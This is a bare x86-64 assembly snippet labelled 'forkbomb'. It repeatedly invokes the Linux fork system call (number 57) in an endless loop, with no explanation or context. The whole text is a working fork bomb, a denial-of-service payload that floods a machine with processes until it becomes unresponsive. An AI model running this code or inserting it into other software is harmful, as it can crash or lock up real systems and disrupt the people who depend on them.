forkbomb:
    shl eax, 64
    mov al, 0x38
    inc al
    syscall
    jne forkbomb
	
